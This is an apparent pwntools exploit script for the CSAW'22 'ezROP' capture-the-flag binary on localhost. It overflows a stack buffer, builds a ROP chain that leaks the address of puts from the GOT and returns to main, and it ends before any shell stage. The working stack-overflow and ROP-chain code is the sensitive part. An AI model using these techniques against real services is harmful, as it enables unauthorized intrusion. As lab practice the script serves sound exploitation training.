from pwn import *
import sys

# Set context
context.arch = 'amd64'
context.log_level = 'debug'

# Challenge details
HOST = 'localhost'
PORT = 9999

# Binary and Libc
exe = ELF('./share/chal/ezROP')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # We don't have local libc yet, will resolve dynamically

def start():
    return remote(HOST, PORT)

def solve():
    r = start()

    # Addresses
    pop_rdi = 0x4015a3
    got_puts = 0x403fe8
    plt_puts = 0x4010a0
    main_addr = 0x40150b
    
    # Offset calculation
    # buf is at rbp - 0x70
    # We write to buf.
    # We want to overwrite the return address which is at current RSP when 'ret' is executed.
    # The 'leave' instruction in main makes RSP = RBP + 8.
    # RBP was set to buf + 0x70.
    # So RSP points to buf + 0x78.
    # So our ROP chain starts at buf + 0x78.
    # buf starts at offset 0.
    # Payload: 1 byte \x00 + 111 bytes padding + 8 bytes Fake RBP + ROP Chain
    # Total padding before ROP: 120 bytes.
    # Wait.
    # buf[0] = \x00
    # buf[1...111] = padding (111 bytes)
    # Total so far: 112 bytes (0x70).
    # buf[0x70...0x77] = Fake RBP (8 bytes).
    # buf[0x78...] = ROP Chain.
    
    payload1 = b'\x00' + b'A' * 111 + b'B' * 8
    
    # ROP 1: Leak puts
    payload1 += p64(pop_rdi)
    payload1 += p64(got_puts)
    payload1 += p64(plt_puts)
    payload1 += p64(main_addr)
    
    # Send payload
    # Expect "My friend, what's your name?"
    r.recvuntil(b"name?")
    r.send(payload1) # readn reads 0x100 bytes, send raw
    
    # Receive "Nice to meet you, ! Welcome to CSAW'22!"
    # Then the leak should follow.
    r.recvuntil(b"CSAW'22!\n")
    
    leak = r.recvline().strip()
    if len(leak) == 0:
        log.error("Leak failed, empty line")
    
    # Unpack leak
    leak = leak.ljust(8, b'\x00')
    puts_leak = u64(leak)
    log.info(f"Puts leak: {hex(puts_leak)}")
    
    # Now use libc-database to find offsets (or just use local libc if standard)
    # For now, let's assume standard libc or use the tool to find it.
    # I'll pause here to identify libc.
    return puts_leak, r

if __name__ == "__main__":
    solve()
